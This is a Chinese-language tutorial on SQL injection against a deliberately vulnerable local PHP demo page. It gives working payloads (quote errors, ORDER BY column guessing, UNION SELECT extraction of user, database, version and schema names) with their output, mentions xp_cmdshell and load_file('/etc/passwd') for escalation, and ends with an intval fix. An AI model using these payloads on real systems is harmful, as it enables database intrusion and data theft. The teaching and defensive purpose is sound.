# SQL注入

### 环境：

​	使用phpstorm IDE 、 xampp集成环境 、php版本7.1

### 解释型语言和编译型语言:

​       解释型语言:运行是由一个运行时组件解释语言代码并执行其中包含的指令语言。

​       编译型语言:是由它的代码在生成可执行文件时换转成机器指令,然后在运行时直接由该语言的计算机处理器执行指令.

​	从理论上讲,任何语言都可使用编译器或解释器或来执行,这种区别不是语言本身的内在特性,通常大多数语言仅通过上述其中一种方式执行.基于解释型语言的执行方式,产生了一	系列叫做代码注入的漏洞。

### 如何才能看懂程序：

​	web应用程序也好，还是app等等，只要和数据库交互就会有CRUD。

​	如何看懂一个程序，分三步：（即便是编程语言C\C++\python\java\等等编程语言都会遵守语法规则去一步步执行）

​	    1.流程：

​		程序的开始例如：php web应用程序首先是有个index.php  里面会包含类、引用那个.php文件调用了那个方法（方法也叫函数）一步一步跟读

​	    2.每个语句的功能：

​		这行代码要执行什么操作，例如：if (a == True){  。。。 }  

​            3.试数：

​		例如：IDE中的debug调试或单元测试，传入参数，放行执行，返回的结果是不是期望值，错误很容易定位。				

### php代码：

```php
<?php

$id = @$_GET['id'];

if (!isset($id) || empty($id)) {
    exit("get.id 参数不能为空");
}

try{
    $dsn = "mysql:host=127.0.0.1; port=3306; dbname=demo;";

    $user = "root";
    $password = "";
    $pdo = new PDO($dsn,$user,$password);

    $sql = "select * from myguests where id = "."'{$id}'";

    echo $sql;
    echo "<br>";

    $res = $pdo->query($sql) or var_dump($pdo->errorInfo());

    $mon = $res->fetch(PDO::FETCH_ASSOC);

    print_r($mon);

} catch (Exception $e) {
    print $e->getMessage();
    exit();
}
?>
```

### 数据库：

```sql
CREATE TABLE MyGuests (
id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
firstname VARCHAR(30) NOT NULL,
lastname VARCHAR(30) NOT NULL,
email VARCHAR(50),
reg_date TIMESTAMP
)
```

### 参数注入：

URL:http://localhost:8888/phpouith/demo.php?id=1  #这是正常访问查询数据库ID的正常行为。

当我们查询并拼接SQL语句时，无任何的过滤限制就存在SQL注入。

出现注入的漏洞在代码开头 ：

```php
$id = @$_GET['id']; #这句话,传入查询参数没过滤。
```

php官方解释：<https://php.net/manual/zh/security.database.sql-injection.php>

拼接一个符号就会查询报错，在页面能看到错误

URL:http://localhost:8888/phpouith/demo.php?id=1'

拼接URLhttp://localhost:8888/phpouith/demo.php?id=1 and 1=1 #不会出现错误

mysql语法，当and 1=1 时1=1数字相等，返回的是true也就是真。语法没有错误，查询的结果也就返回了id=1的查询语句

因为Mysql没有Boolen类型 ，不过 true 等于1 false等于0

```sql
select * from myguests where id = 1 and 1 = 1;
```

mysql Oracle sqlserver 语法基本一样 只有一些细微的差别。

String 查询 http://localhost:8888/phpouith/demo.php?id=1' and '1'='1

```sql
select * from myguests where id = '1' and '1'='1' #string(1)=string(1) 同样为True
```

更加有意思的是这段拼接： http://localhost:8888/phpouith/demo.php?id=1' and '1'='1'='1

```sql
select * from myguests where id = '1' and '1'='1'='1'
```

id = '1' and '1'='1'='1' 表达式是从左到右, id = '1' 返回 0,查询的表中id. 新的表达式0='1' , =不能直接比较不同类型的两个值,'1'会被隐士转换为double类型进行于0比较,但这个字母数字值不能被转换,会返回一个0, 最终表达式 0=0,结果为true。

猜表列数：http://localhost:8888/phpouith/demo.php?id=1' order by 5 -- 1 #表中总共五列，

```sql
select * from myguests where id = '1' order by 5 -- 1' #一直加大直到报错，说明表中只有五列
```

联合查询 union :http://localhost:8888/phpouith/demo.php?id=1'union select 1,2,3,4,5 -- 1

```sql
select * from myguests where id = '1' union select 1,2,3,4,5 -- 1'
select * from myguests where id = '1' union select 1,2,3,4,5,6 -- 1' #增加到6时表中列数不足会报错，说明表中只有5列
```

调用mysql函数： http://localhost:8888/phpouith/demo.php?id=-1' union select 1, user(), database(),4,5 -- 1

```sql
select * from myguests where id = '=-1' union select 1, user(), database(),4,5 -- 1'

Array ( [id] => 1 [firstname] => root@localhost [lastname] => demo [email] => 4 [reg_date] => 5 ) 

http://localhost:8888/phpouith/demo.php?id==-1' union select 1, user(), database(),version(),5 -- 1

select * from myguests where id = '=-1' union select 1, user(), database(),version(),5 -- 1'

Array ( [id] => 1 [firstname] => root@localhost [lastname] => demo [email] => 10.1.38-MariaDB [reg_date] => 5 ) 

```

函数功能 ：DATABASE()返回当前数据库名，VERSION()返回当前数据库版本，USER()返回当前登录用户名，PASSWORD(str)返回字符串str的加密版本

MD5()返回字符串str的MD5值。  **更多函数用法详见:mysql官方文档**

通过攻破数据库提升权限:

xp_cmdshell 运行数据库管理员以cmd.exe命令提示符相同的方式执行操作系统命令

Oracle 可利用DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY  使用DBMS_JAVA.RUNJAVA  Java类来访问系统

MySql FILE_PRIV 可用以读取并写入文件. select load_file('/etc/passwd')



连接的用户、数据、服务器版本：http://localhost:8888/phpouith/demo.php?id=-1' union select 1, 2, 3,4, group_concat(schema_name) from information_schema.schemata -- 1

```sql
select * from myguests where id = '=-1' union select 1, 2, 3,4, group_concat(schema_name) from information_schema.schemata -- 1'
Array ( [id] => 1 [firstname] => 2 [lastname] => 3 [email] => 4 [reg_date] => demo,information_schema,mysql,performance_schema,phpmyadmin,test ) 
```



### 修复：

```php
$id = @intval($_GET['id']);
```

php官方解释：<https://php.net/manual/zh/function.intval.php>

修复后：http://localhost:8888/phpouith/demo.php?id=1‘ #不在报错

```sql
select * from myguests where id = '1'
Array ( [id] => 1 [firstname] => jack [lastname] => losse [email] => jack@email.com [reg_date] => 2019-04-21 14:34:16 ) 
```

